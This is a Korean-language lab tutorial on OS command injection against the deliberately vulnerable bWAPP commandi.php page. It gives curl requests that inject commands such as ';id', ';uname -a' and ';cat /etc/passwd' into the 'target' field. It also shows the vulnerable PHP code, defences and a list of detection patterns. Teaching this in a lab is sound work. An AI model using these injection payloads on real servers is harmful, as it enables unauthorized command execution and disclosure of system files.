# 웹 해킹 실습 교육: Command Injection (OS Command Injection)

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `Kali Linux` |
| **실습 URL** | `http://192.168.0.20/bWAPP/commandi.php` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 목적** | 웹 애플리케이션의 OS Command Injection 취약점 이해 및 방어 방법 학습 |

---

## 🎯 취약점 개요

### Command Injection이란?

**OS Command Injection**은 웹 애플리케이션이 사용자 입력값을 서버 측 시스템 명령어에 안전하게 처리하지 않고 직접 연결할 때 발생하는 취약점입니다.

공격자는 이를 악용해:

- 서버 시스템 명령 실행
- 현재 계정 권한 확인
- 운영체제 및 커널 정보 확인
- 사용자 계정 정보 열람
- 네트워크 및 애플리케이션 환경 정보 수집
- 추가 침투를 위한 발판 확보

를 수행할 수 있습니다.

bWAPP의 `commandi.php`는 보안 레벨이 낮은 상태에서 입력값이 시스템 명령에 적절히 필터링 없이 포함될 수 있어, 교육용으로 Command Injection 개념을 이해하는 데 적합한 실습 페이지입니다.

### OWASP Top 10 분류
- **A03:2021** – Injection

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] bWAPP 로그인 및 세션 유지
        │
        ▼
[2단계] commandi.php 페이지 동작 확인
        │
        ▼
[3단계] 정상 입력으로 기능 확인
        │
        ▼
[4단계] 입력값 뒤에 명령 구분자를 삽입하여 OS 명령 주입
        │
        ▼
[5단계] 시스템 정보 수집
        (id, uname -a, hostname 등)
        │
        ▼
[6단계] 추가 정보 확인
        (/etc/passwd, 웹 경로, 계정 정보 등)
```

---

## 🛠️ 단계별 실습 템플릿

> 아래 명령어는 **실습 후 결과를 채워 넣기 위한 템플릿**입니다.  
> 결과값은 환경에 맞게 직접 반영하세요.

### Step 1: 로그인 및 세션 유지

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/login.php" \
     -d "login=bee&password=bug&security_level=0&form=submit" \
     -L
```

**실행 결과 예시:**
```text
로그인 성공 후 PHPSESSID 및 security_level 쿠키 획득
```

> 💡 **포인트**: 이후 요청에서는 `-b /home/kali/docker_exam/bwapp_cookie.txt` 형태로 세션을 재사용합니다.

---

### Step 2: 대상 페이지 확인

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/commandi.php"
```

**확인 포인트:**
- 입력 폼 존재 여부
- 어떤 파라미터를 받는지
- 정상 입력 시 어떤 결과를 반환하는지

---

### Step 3: 정상 동작 확인

먼저 정상적인 값으로 기능이 어떻게 동작하는지 확인합니다.

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/commandi.php" \
     -d "target=127.0.0.1&form=submit"
```

**실행 결과 예시:**
```text
정상적인 ping 또는 유사한 시스템 명령 결과 출력
```

> 💡 **포인트**: 정상 입력 결과를 먼저 알아야, 뒤에서 주입한 결과와 비교가 쉬워집니다.

---

### Step 4: 명령 구분자를 활용한 Injection 시도

입력값 뒤에 명령 구분자를 붙여 OS 명령이 함께 실행되는지 확인합니다.

예시 구분자:
- `;`
- `&&`
- `|`
- `||`

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/commandi.php" \
     -d "target=127.0.0.1;id&form=submit"
```

**실행 결과 예시:**
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 🚨 **취약점 확인 포인트**: 입력값 일부가 단순 문자열이 아니라 서버의 시스템 명령으로 실행되면 Command Injection 취약점이 성립합니다.

---

### Step 5: 시스템 정보 수집

#### 5-1. 현재 계정 확인

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/commandi.php" \
     -d "target=127.0.0.1;id&form=submit"
```

**실행 결과:**
```text
[여기에 실제 결과 입력]
```

---

#### 5-2. 운영체제 및 커널 정보 확인

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/commandi.php" \
     -d "target=127.0.0.1;uname -a&form=submit"
```

**실행 결과:**
```text
[여기에 실제 결과 입력]
```

---

#### 5-3. 호스트명 확인

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/commandi.php" \
     -d "target=127.0.0.1;hostname&form=submit"
```

**실행 결과:**
```text
[여기에 실제 결과 입력]
```

---

### Step 6: 계정 정보 확인

#### 6-1. `/etc/passwd` 일부 확인

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/commandi.php" \
     -d "target=127.0.0.1;cat /etc/passwd | head -n 10&form=submit"
```

**실행 결과:**
```text
[여기에 실제 결과 입력]
```

> ⚠️ 교육용 환경에서만 수행하고, 실제 운영 환경에서는 절대 허가 없이 시도하면 안 됩니다.

---

#### 6-2. 웹 애플리케이션 경로 확인

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/commandi.php" \
     -d "target=127.0.0.1;pwd&form=submit"
```

**실행 결과:**
```text
[여기에 실제 결과 입력]
```

---

#### 6-3. 웹 디렉터리 목록 확인

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/commandi.php" \
     -d "target=127.0.0.1;ls /var/www/bWAPP/&form=submit"
```

**실행 결과:**
```text
[여기에 실제 결과 입력]
```

---

## 📊 탈취 정보 정리 템플릿

| 수집 정보 | 실제 결과 |
|-----------|-----------|
| **실행 계정** | `[예: www-data]` |
| **UID/GID** | `[예: uid=33(www-data)...]` |
| **호스트명** | `[실제 결과]` |
| **OS/커널 버전** | `[실제 결과]` |
| **웹 디렉터리 경로** | `[실제 결과]` |
| **주요 시스템 계정** | `[예: root, daemon, www-data, bee ...]` |

---

## 🧨 취약점 원인 분석

일반적으로 취약한 서버 코드는 아래와 비슷한 구조를 가집니다.

```php
<?php
$target = $_POST['target'];
system("ping -c 1 " . $target);
?>
```

문제는 사용자 입력값 `$target` 이 아무런 검증 없이 시스템 명령에 직접 연결된다는 점입니다.

예를 들어 사용자가:

```text
127.0.0.1;id
```

를 입력하면 서버에서는 실제로 아래와 같은 명령을 실행할 수 있습니다.

```bash
ping -c 1 127.0.0.1;id
```

즉, 원래 의도했던 `ping` 외에 `id` 명령까지 이어서 실행됩니다.

---

## 🛡️ 방어 방안

### 1. 시스템 명령어 직접 호출 금지
가장 좋은 방법은 사용자 입력을 시스템 셸 명령과 직접 연결하지 않는 것입니다.

예:
- IP 유효성 검사를 애플리케이션 로직에서 수행
- 별도 라이브러리/API로 대체
- ping 기능 자체를 서버 명령 호출 없이 구현

### 2. 입력값 검증(Whitelist)
입력값이 IP 또는 도메인이라면 허용 가능한 형식만 엄격히 통과시켜야 합니다.

예:
```php
if (!filter_var($target, FILTER_VALIDATE_IP)) {
    die("잘못된 IP 형식입니다.");
}
```

### 3. 셸 메타문자 차단
`;`, `&`, `|`, `` ` ``, `$()`, `>` 등 명령 연결과 관련된 메타문자를 차단해야 합니다.

### 4. 최소 권한 원칙
웹 서버 프로세스가 불필요하게 높은 권한을 가지지 않도록 설정합니다.  
`www-data` 같은 제한된 계정으로 동작하도록 유지해야 합니다.

### 5. 로깅 및 탐지
비정상적인 입력 패턴, 예를 들어:
- `;id`
- `;cat /etc/passwd`
- `&& whoami`
- `| uname -a`

같은 요청은 WAF 또는 로그 모니터링을 통해 탐지할 수 있어야 합니다.

---

## 📚 추가 학습 자료

- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [bWAPP 공식 사이트](http://www.itsecgames.com/)

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
>
> 허가받지 않은 시스템에 동일한 기법을 적용하는 것은  
> **정보통신망법 위반(해킹)**으로 **형사 처벌** 대상이 됩니다.  
>
> **반드시 본인 소유 또는 적법한 동의를 받은 환경에서만 실습하세요.**

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
